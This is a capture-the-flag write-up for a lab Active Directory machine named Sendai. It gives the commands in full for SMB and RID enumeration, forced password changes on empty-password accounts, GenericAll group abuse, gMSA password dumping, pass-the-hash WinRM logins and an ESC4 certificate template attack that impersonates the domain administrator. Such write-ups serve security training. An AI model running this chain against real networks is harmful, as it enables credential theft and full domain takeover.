Difficulty: Medium
### Information Gathering

IP Address: 10.129.234.66

# User Flag
### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.234.66
```

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

The SMB Shares are enumerated as a guest user.
```
netexec smb 10.129.234.66 -u 'guest' -p '' --shares
```

The shares are as follows.
```
 ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.66   445    DC               Users           READ
```

The sendai share looks promising.
```
smbclient //sendai.vl/sendai -U '%'
```

The files `incident.txt` and `guidelines.txt` are downloaded.
The is also a users directory, a custom word list from those users will be made.

```
anthony.smith
clifford.davey
elliot.yates
lisa.williams
susan.harper
temp
thomas.powell
```

Valid credentials were returned `temp:anthony.smith`.

While those credentials were marked as valid, there was not much twordlisto do with those credentials.

Further user enumeration is performed.
```
netexec smb sendai.vl -u 'guest' -p '' --rid-brute
```

This is the new updated userlist.
```
anthony.smith
clifford.davey
elliot.yates
lisa.williams
susan.harper
temp
thomas.powell
websvc
staff
Dorothy.Jones
Kerry.Robins
Naomi.Gardner
Anthony.Smith
Susan.Harper
Stephen.Simpson
Marie.Gallagher
Kathleen.Kelly
Norman.Baxter
Jason.Brady
Elliot.Yates
Malcolm.Smith
Lisa.Williams
Ross.Sullivan
Clifford.Davey
Declan.Jenkins
Lawrence.Grant
Leslie.Johnson
Megan.Edwards
Thomas.Powell
ca-operators
admsvc
mgtsvc$
support
```

Empty password testing is used to check the accounts validity.
```
netexec smb sendai.vl -u users.txt -p ''  --continue-on-success
```

`thomas.powell` and `elliot.yates` must have their password changed according to `netexec`

```
netexec smb sendai.vl -u 'thomas.powell' -p '' -M change-password -o USER=thomas.powell NEWPASS=NewPass123!
```

```
netexec smb sendai.vl -u 'elliot.yates' -p '' -M change-password -o USER=elliot.yates NEWPASS=NewPass123!
```

Both users password have been successfully changed.

Bloodhound enumeration is performed.
```
bloodhound-ce-python -u 'elliot.yates' -p 'NewPass123!' -ns 10.129.234.66 -d sendai.vl -c All --zip
```

![](<Screenshot 2026-07-28 at 05.43.25.png>)
![](<Screenshot 2026-07-28 at 05.45.02.png>)

It is possible to exploit both `GenericAll` and `ReadGMSAPassword`.

In order to add the user via `GenericAll` privileges.
```
net rpc group addmem "ADMSVC" "elliot.yates" -U "sendai"/"elliot.yates"%'NewPass123!' -S "dc.sendai.vl"
```

To exploit `ReadGMSAPassword`.
```
python gMSADumper.py -u 'elliot.yates' -p 'NewPass123!' -d 'sendai.vl'
```

WinRM Session is attempted.
```
evil-winrm -i 10.129.234.66 -u 'mgtsvc$' -H 'e0915507b35c02ccc57959c4a1fc6051'
```

The user flag has been successfully obtained.![](<Screenshot 2026-07-28 at 05.53.52.png>)

# Root Flag
#### Privilege Escalation

Through `winpeas.exe`, it is possible to know the location of the service configuration in the registry.

```
dir -Path HKLM:\SYSTEM\CurrentControlSet\Services | Get-ItemProperty | Select-Object ImagePath
```

Those are the new credentials.
`clifford.davey:RFmoB2WplgE_3p`

While the new credentials do not work on WinRM, they can work for SMB.

The user can actually access a share called `config` and find a configuration file for MSSQL.

```
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```

However, this user did not had interesting points to note, neither in Bloodhound.

Knowing that `clifford.davey` is in the CA Operators group, certificate enumeration is attempted.
```
certipy-ad find -u 'clifford.davey@sendai.vl' -p RFmoB2WplgE_3p -vulnerable -stdout
```

As expected, this user is vulnerable to `ESC4`.

```
certipy-ad template -dc-ip 10.129.234.66 -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -template SendaiComputer -write-default-configuration
```

```
certipy-ad req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -ca sendai-DC-CA -template SendaiComputer -target dc.sendai.vl -target-ip 10.129.234.66 -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
```

```
certipy-ad auth -pfx administrator.pfx -domain 'sendai.vl' -dc-ip 10.129.234.66
```


After exploitation, the WinRM session is launched with the hash of `administrator`.
```
evil-winrm -i 10.129.234.66 -u 'administrator' -H 'cfb106feec8b89a3d98e14dcbe8d087a'
```

The root flag has been successfully obtained.
![](<Screenshot 2026-07-28 at 06.52.48.png>)